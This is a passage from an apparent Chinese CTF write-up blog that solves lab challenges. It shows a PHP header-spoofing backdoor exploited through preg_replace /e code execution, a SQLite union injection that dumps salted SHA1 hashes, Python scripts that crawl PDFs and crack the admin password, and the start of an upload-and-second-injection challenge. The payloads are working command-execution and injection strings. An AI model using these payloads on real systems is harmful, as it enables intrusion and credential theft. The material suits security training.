&#125;,</span></span><br><span class="line"><span class="string">                     &#123; type: &#x27;checkbox&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;name&#x27;, title: &#x27;设备名&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;area&#x27;, title: &#x27;区域&#x27; &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;status&#x27;, title: &#x27;维护状态&#x27;, minWidth: 120, sort: true &#125;,</span></span><br><span class="line"><span class="string">                     &#123; field: &#x27;check&#x27;, title: &#x27;设备开关&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">            ],</span></span><br><span class="line"><span class="string">            page: true</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    layui.use(&#x27;element&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        var element = layui.element; //导航的hover效果、二级菜单等功能，需要依赖element模块</span></span><br><span class="line"><span class="string">        //监听导航点击</span></span><br><span class="line"><span class="string">        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;</span></span><br><span class="line"><span class="string">            //console.log(elem)</span></span><br><span class="line"><span class="string">            layer.msg(elem.text());</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$page</span> = <span class="subst">$_GET</span>[page];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (isset(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (ctype_alnum(<span class="subst">$page</span>)) &#123;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;&lt;?php echo <span class="subst">$page</span>; die();?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;</span>text-align:center<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;</span>lead<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;input&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;ta:text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (strpos(<span class="subst">$page</span>, &#x27;text&#x27;) &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (<span class="subst">$page</span> === &#x27;index.php&#x27;) &#123;</span></span><br><span class="line"><span class="string">                    die(&#x27;Ok&#x27;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                    include(<span class="subst">$page</span>);</span></span><br><span class="line"><span class="string">                    die();</span></span><br><span class="line"><span class="string">                ?&gt;</span></span><br><span class="line"><span class="string">        &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (<span class="subst">$_SERVER</span>[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span></span><br><span class="line"><span class="string">//这里验证X-Forwarded-For头是不是127.0.0.1</span></span><br><span class="line"><span class="string">    echo &quot;</span>&lt;br &gt;Welcome My Admin ! &lt;br &gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    <span class="subst">$pattern</span> = <span class="subst">$_GET</span>[pat];</span></span><br><span class="line"><span class="string">    <span class="subst">$replacement</span> = <span class="subst">$_GET</span>[rep];</span></span><br><span class="line"><span class="string">    <span class="subst">$subject</span> = <span class="subst">$_GET</span>[sub];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if (isset(<span class="subst">$pattern</span>) &amp;&amp; isset(<span class="subst">$replacement</span>) &amp;&amp; isset(<span class="subst">$subject</span>)) &#123;</span></span><br><span class="line"><span class="string">        preg_replace(<span class="subst">$pattern</span>, <span class="subst">$replacement</span>, <span class="subst">$subject</span>);</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        die();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>首先进行X-Forwarded-For:127.0.0.1参数伪造</p>
<p>之后由于preg_replace()函数的&#x2F;e漏洞进行代码执行</p>
<p>这段 PHP 代码会获取 3 个变量：pat、rep 和 sub 的值，然后进入一个 if-else 语句。<strong>isset() 函数</strong>在 PHP 中用来判断变量是否声明，此处如果这 3 个值都有传递就会执行 **preg_replace()**函数。<br> preg_replace 函数执行一个正则表达式的搜索和替换，语法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy <span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>$pattern</td>
<td>要搜索的模式，可以是字符串或一个字符串数组</td>
</tr>
<tr>
<td>$replacement</td>
<td>用于替换的字符串或字符串数组</td>
</tr>
<tr>
<td>$subject: 要搜索替换的目标字符串或字符串数组</td>
<td></td>
</tr>
<tr>
<td>$limit</td>
<td>可选，对于每个模式用于每个 subject 字符串的最大可替换次数。默认是 -1（无限制）</td>
</tr>
<tr>
<td>$count</td>
<td>可选，为替换执行的次数</td>
</tr>
<tr>
<td>如果 subject 是一个数组， preg_replace() 返回一个数组，其他情况下返回一个字符串。如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</td>
<td></td>
</tr>
<tr>
<td>这个函数有个 “&#x2F;e” 漏洞，“&#x2F;e” 修正符使 preg_replace() 将 replacement 参数当作 PHP  代码进行执行。如果这么做要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含  preg_replace() 的行中出现语法解析错误。</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/abc/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<p>获得css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</p>
<p>查看一下s3chahahaDir这个目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?pat=/abc/e&amp;rep=system(&#x27;ls%20s3chahahaDir&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<p> 执行成功，发现 s3chahahaDir 下有个 flag 文件夹，那就更可疑了，再次执行 ls 命令在该文件中查看内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?pat=/abc/e&amp;rep=system(&#x27;ls%20s3chahahaDir/flag&#x27;)&amp;sub=abc</span><br></pre></td></tr></table></figure>

<p> 执行成功，发现 flag 文件夹下有一个 flag.php 文件，使用 cat 命令查看文件。查看之后打开 F12，即可看到 flag </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/abc/e&amp;rep=system(&#x27;cat%20s3chahahaDir/flag/flag.php&#x27;)&amp;sub=abc </span><br></pre></td></tr></table></figure>

<h1 id="sqlite-注入引发的pdf爬取与sha1密码爆破"><a href="#sqlite-注入引发的pdf爬取与sha1密码爆破" class="headerlink" title="sqlite 注入引发的pdf爬取与sha1密码爆破"></a>sqlite 注入引发的pdf爬取与sha1密码爆破</h1><p>打开没有发现什么有用信息,扫一下后台目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://111.200.241.244:52362/</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101059303.png" alt="image-20220310105938224"></p>
<p>挨个访问一下发现有</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101059580.png" alt="image-20220310105947523"></p>
<p>在admin.php页面发现</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101058568.png" alt="image-20220310105811511"></p>
<p>不可能注入成功</p>
<p>login.php登录试试发现输入单引号有报错</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101059373.png" alt="image-20220310105904267"></p>
<p>可以得到是sqlite数据库</p>
<p>这个页面查看源码看看,发现有一个debug参数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101059647.png" alt="image-20220310105918595"></p>
<p>这里地址栏输入一下返回了部分源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现这里是判断查询数据是否存在,存在注入且将信息存放到了cookie中</p>
<p>tips：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sqlite数据库有一张sqlite_master表，</span><br><span class="line">里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息</span><br></pre></td></tr></table></figure>

<p>这里构造查询用户创建表时的相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr=1&#x27;union select name,sql from sqlite_master--+&amp;pw=a</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101100466.png" alt="image-20220310110033355"></p>
<p>发现在coolie中存在有信息进行url解码得到有name,password,hint字段</p>
<p>构造查询name,password,hint字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr=&#x27;union select id,group_concat(name) from Users--&amp;pw=a</span><br><span class="line">usr=&#x27;union select id,group_concat(password) from Users--&amp;pw=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>name</th>
<th>password</th>
<th>hint</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>3fab54a50e770d830c0416df817567662a9dc85c</td>
<td>my fav word in my fav paper?</td>
</tr>
<tr>
<td>fritze</td>
<td>54eae8935c90f467427f05e4ece82cf569f89507</td>
<td>!,my love is…?</td>
</tr>
<tr>
<td>hansi</td>
<td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td>
<td>,the password is password</td>
</tr>
</tbody></table>
<p>所以这里需要查询他的论文</p>
<p>首先进行pdf文件的爬取工作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</span></span><br><span class="line"><span class="string"> 匹配这个名称  使用正则表达式首先[]表示字符集匹配集合中的任意字符[a-fA-F0-9]原因是哈希函数是只有a-f A-F 0-9 中的字符</span></span><br><span class="line"><span class="string">  [a-fA-F0-9]&#123;32&#125; 表示匹配前面三十二个字符</span></span><br><span class="line"><span class="string">  [a-fA-F0-9]&#123;32&#125;\.pdf 表示匹配.pdf这个字符</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1/3/7/8/index.html</span></span><br><span class="line"><span class="string">1/index.html 实例</span></span><br><span class="line"><span class="string">匹配后面的名字    ([0-9]&#123;1&#125;\/) &#123;1&#125;表示匹配数字一次首先将1/作为一个整体进行匹配, &#123;0,4&#125;表示匹配0次或者4次index.html表示匹配index.html字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">re1 = <span class="string">&#x27;[a-fA-F0-9]&#123;32&#125;\.pdf&#x27;</span></span><br><span class="line">re2 = <span class="string">&#x27;[0-9\/]&#123;2,2&#125;index.html&#x27;</span></span><br><span class="line">pdf_list = []  <span class="comment"># 创建一个pdf列表,用于储存pdf网址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;中括号[]：</span></span><br><span class="line"><span class="string">代表list列表数据类型，列表是一种可变序列&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取pdfurl列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pdf</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">global</span> pdf_list</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    req = requests.get(url)</span><br><span class="line">    re_1 = re.findall(re1, req.text)  <span class="comment"># 这里使用re匹配响应中符合的pdf名称</span></span><br><span class="line">    <span class="comment"># print(re_1)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re_1:</span><br><span class="line">        pdf_url = url + i</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">        <span class="comment"># print(pdf_list)</span></span><br><span class="line">    re_2 = re.findall(re2, req.text)</span><br><span class="line">    <span class="comment"># print(re_2)</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> re_2:</span><br><span class="line">        new_url = url + j[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        <span class="comment"># print(j[0:2])</span></span><br><span class="line">        <span class="comment"># print(new_url)</span></span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    <span class="comment"># print(pdf_list)</span></span><br><span class="line">    <span class="keyword">return</span> pdf_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取pdf文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># req = requests.get(url)</span></span><br><span class="line">    <span class="comment">#print(len(url))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(url)):</span><br><span class="line">        url1 = url[i]</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        req = urllib.request.urlopen(url1)<span class="comment"># 这里使用的是urllib库的request方法的urlopen将对url发起默认get请求</span></span><br><span class="line">        filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.pdf&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;./pdf/<span class="subst">&#123;filename&#125;</span>&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开一个文件并以f为代名 wb 以二进制格式打开文件只用于写入,如果文件已存在则打开文件,并从开头进行编辑,即原有内容会被删除.</span></span><br><span class="line">            block_size = <span class="number">8192</span>  <span class="comment"># 定义一个读取量防止过大爆内存                                 如果该文件不存在,创建新文件,一般用于非文本文件如图片</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                buffer = req.read(block_size)  <span class="comment"># 这里使用read方法进行读取文件默认返回bytes类型</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> buffer:  <span class="comment"># 当buffer为零时即为假那么取反变为真跳出循环</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                f.write(buffer)  <span class="comment"># 进行文件的写入</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sucessful to download&quot;</span> + <span class="string">&quot; &quot;</span> + filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pdf_list = get_pdf(<span class="string">&#x27;http://111.200.241.244:63725/&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(pdf_list)</span></span><br><span class="line">    get_file(pdf_list)</span><br><span class="line">    <span class="comment"># req  = requests.get(&#x27;http://111.200.241.244:63725/c4ca4238a0b923820dcc509a6f75849b.pdf&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 接下来就是提取pdf里的文本信息了，我在网上找了一个pdf转txt的工具：pdftotext.exe，这个工具可以通过命令行把pdf转txt文件，由于文件相对较多，可以通过python多线程来执行，当然也可以直接手动转换。 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">thread</span>(<span class="params">cmd</span>):<span class="comment">#创建一个cmd类用于通过os.system调用系统cmd</span></span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line">tsk=[]<span class="comment">#创建一个列表用于存放线程对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.pdf&#x27;</span><span class="comment">#获取文件名称</span></span><br><span class="line">    filename = <span class="string">&#x27;D:\Download\pdf\\&#x27;</span> + filename</span><br><span class="line">    cmd = <span class="string">r&quot;D:\Data\secquan\tools\编码解码\pdftotext\pdftotext.exe %s&quot;</span>%(filename)<span class="comment">#调用cmd的命令</span></span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    t = threading.Thread(target=thread(cmd))<span class="comment">#创建线程对象</span></span><br><span class="line">    tsk.append(t)<span class="comment">#将线程对象添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tsk:</span><br><span class="line">    t.start()<span class="comment">#启动线程对象</span></span><br></pre></td></tr></table></figure>

<p>进行本地密码爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiqu</span>(<span class="params">filename</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;./pdf/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename), <span class="string">&#x27;r&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)<span class="comment">#这里由于并不是正常编码格式所以会产生保存而使用errors=&quot;ignore&quot;可以将报错信息进行屏蔽</span></span><br><span class="line">    doc = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    dic = doc.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    new_dic = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        i = i.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            new_dic.append(i)</span><br><span class="line">    <span class="keyword">return</span> new_dic</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha</span>(<span class="params">word</span>):</span><br><span class="line">    md = hashlib.sha1()</span><br><span class="line">    md.update((word + <span class="string">&#x27;Salz!&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    haxstr = md.hexdigest()</span><br><span class="line">    <span class="comment">#print(haxstr)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span> == haxstr:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span> + word)</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">34</span>):</span><br><span class="line">        n = tiqu(<span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> n:</span><br><span class="line">            sha(k)</span><br><span class="line">            <span class="comment">#print(base64.b64encode(k.encode(&quot;utf-8&quot;)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到密码ThinJerboa用户名admin</p>
<p>到admin.php进行登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101101554.png" alt="image-20220310110100433"></p>
<h1 id="文件上传配合二次注入"><a href="#文件上传配合二次注入" class="headerlink" title="文件上传配合二次注入"></a>文件上传配合二次注入</h1><p>扫目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203131651570.png" alt="image-20220313165115499"></p>
<p>下载<a target="_blank" rel="noopener" href="http://www.tar.gz文件得到源码/">www.tar.gz文件得到源码</a></p>
<p><strong>xdctf.sql</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES utf8;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">DROP DATABASE IF EXISTS `xdctf`;</span><br><span class="line">CREATE DATABASE xdctf;</span><br><span class="line">USE xdctf;</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `file`;</span><br><span class="line">CREATE TABLE `file` (</span><br><span class="line">  `fid` int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `filename` varchar(256) NOT NULL,</span><br><span class="line">  `oldname` varchar(256) DEFAULT NULL,</span><br><span class="line">  `view` int(11) DEFAULT NULL,</span><br><span class="line">  `extension` varchar(32) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`fid`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是数据库的信息主要提供给几个关键字段,有oldname    filename    extension</p>
<p><strong>common.inc.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午7:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">	<span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ayshbdfuybwayfgby&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dbname&quot;</span> =&gt; <span class="string">&quot;xdctf&quot;</span>,</span><br><span class="line">);<span class="comment">#数据库连接的基本量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"><span class="variable">$req</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span 